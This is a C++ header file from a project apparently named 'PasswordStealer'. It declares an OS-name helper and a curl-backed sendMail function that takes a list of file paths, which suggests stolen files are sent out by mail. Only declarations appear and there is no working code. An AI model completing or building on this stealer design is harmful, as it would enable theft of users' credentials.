//
// Created by jkearnsl on 10.02.24.
//

#ifndef PASSWORDSTEALER_UTILS_H
#define PASSWORDSTEALER_UTILS_H

#include <string>
#include <curl/curl.h>
#include <iostream>
#include <list>

std::string osName();
int sendMail(const std::list<std::string>& filepaths);

#endif //PASSWORDSTEALER_UTILS_H
